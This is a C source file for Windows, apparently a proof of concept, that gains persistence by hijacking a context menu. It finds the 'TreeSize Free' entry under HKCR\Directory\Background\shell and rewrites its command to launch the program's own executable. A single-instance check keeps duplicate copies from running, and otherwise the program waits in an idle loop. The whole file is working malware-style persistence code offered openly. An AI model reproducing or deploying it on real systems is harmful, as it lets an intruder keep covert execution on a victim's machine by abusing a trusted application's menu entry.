#include <windows.h>
#include <Psapi.h>
#include <stdio.h>

#define WCHAR_MAXPATH (MAX_PATH * sizeof(WCHAR))

DWORD HijackContextMenu(VOID);
BOOL  DoIExist(VOID);

int main(VOID)
{
	DWORD dwReturn = ERROR_SUCCESS;
	dwReturn = HijackContextMenu();

	if (dwReturn != ERROR_SUCCESS && dwReturn != ERROR_FILE_EXISTS)
	{
		return dwReturn;
	}

	if (DoIExist())
	{
		MessageBoxA(NULL, "", "", MB_OK);
		ExitProcess(GetLastError());
	}

	while (TRUE)
	{
		Sleep(1000);
	}

	return ERROR_SUCCESS;
}

BOOL  DoIExist(VOID)
{
	DWORD dwProcesses[1024] = { 0 };
	WCHAR wPath[WCHAR_MAXPATH] = { 0 };
	DWORD wPathSize = WCHAR_MAXPATH;
	DWORD dwNeeded = 0;
	DWORD dwProcess = 0;
	DWORD dwCount = 0;
	
	if (!EnumProcesses(dwProcesses, sizeof(dwProcesses), &dwNeeded))
	{
		return FALSE;
	}

	if (GetModuleFileName(NULL, wPath, wPathSize) == 0)
	{
		return FALSE;
	}

	dwProcess = dwNeeded / sizeof(DWORD);
	for (DWORD dwIndex = 0; dwIndex < dwProcess; dwIndex++)
	{
		WCHAR wModule[WCHAR_MAXPATH] = { 0 };
		if (dwProcesses[dwIndex] != 0)
		{
			DWORD dwId = dwProcesses[dwIndex];
			HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwId);
			if (hHandle != NULL)
			{
				HMODULE hMod;
				DWORD dwSize;

				if (EnumProcessModules(hHandle, &hMod, sizeof(hMod), &dwSize))
				{
					GetModuleBaseName(hHandle, hMod, wModule, (sizeof(wModule) / sizeof(WCHAR)));
					
					if (wcsstr(wPath, wModule) != NULL)
					{
						dwCount++;
						if (dwCount > 1)
						{
							return TRUE;
						}
					}
				
				}
			}

			if (hHandle)
			{
				CloseHandle(hHandle);
			}
		}
	}

	return FALSE;
}



DWORD HijackContextMenu(VOID)
{
	HKEY hKey = HKEY_CLASSES_ROOT;
	WCHAR lpSubKey[WCHAR_MAXPATH] = L"Directory\\Background\\shell";
	HKEY  hOpenKey = NULL;
	HKEY  phkResult;
	DWORD dwSubKeys;

	if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_ALL_ACCESS, &phkResult) != ERROR_SUCCESS)
	{
		return GetLastError();
	}

	if (RegQueryInfoKey(phkResult, NULL, NULL, NULL, &dwSubKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
	{
		goto EXIT_ROUTINE;
	}

	for (DWORD i = 0; i < dwSubKeys; i++)
	{
		DWORD Enum;
		WCHAR lpName[WCHAR_MAXPATH] = { 0 };
		WCHAR lpFullName[WCHAR_MAXPATH] = { 0 };
		DWORD lpcchName = WCHAR_MAXPATH;
		hOpenKey = 0;
		WCHAR bValue[WCHAR_MAXPATH] = L"CALC.EXE";
		WCHAR pvData[2048] = { 0 };
		WCHAR wModulePath[WCHAR_MAXPATH] = { 0 };

		Enum = RegEnumKeyExW(phkResult, i, lpName, &lpcchName, NULL, NULL, NULL, NULL);

		if (Enum != ERROR_SUCCESS && Enum != ERROR_NO_MORE_ITEMS)
		{
			goto EXIT_ROUTINE;
		}

		if (wcsstr(lpName, L"TreeSize Free") != NULL)
		{
			wcscat(lpName, L"\\command");
			if (RegOpenKeyEx(phkResult, lpName, 0, KEY_ALL_ACCESS, &hOpenKey) != ERROR_SUCCESS)
			{
				goto EXIT_ROUTINE;
			}

			Enum = 2048;
			if (RegGetValue(hOpenKey, NULL, NULL, RRF_RT_REG_SZ, NULL, pvData, &Enum) != ERROR_SUCCESS)
			{
				goto EXIT_ROUTINE;
			}

			if (GetModuleFileName(NULL, bValue, WCHAR_MAXPATH) == 0)
			{
				goto EXIT_ROUTINE;
			}

			if (wcscmp(bValue, pvData) == ERROR_SUCCESS)
			{
				if (phkResult)
				{
					RegCloseKey(phkResult);
				}

				if (hOpenKey)
				{
					RegCloseKey(hOpenKey);
				}

				return ERROR_FILE_EXISTS;
			}

			if (RegSetValueEx(hOpenKey, NULL, 0, REG_SZ, (PBYTE)bValue, sizeof(bValue)) != ERROR_SUCCESS)
			{
				goto EXIT_ROUTINE;
			}

			if (hOpenKey)
			{
				RegCloseKey(hOpenKey);
			}

			break;
		}

	}

	if (phkResult)
	{
		RegCloseKey(phkResult);
	}

	return ERROR_SUCCESS;

EXIT_ROUTINE:

	if (phkResult)
	{
		RegCloseKey(phkResult);
	}

	if (hOpenKey)
	{
		RegCloseKey(hOpenKey);
	}

	return GetLastError();

}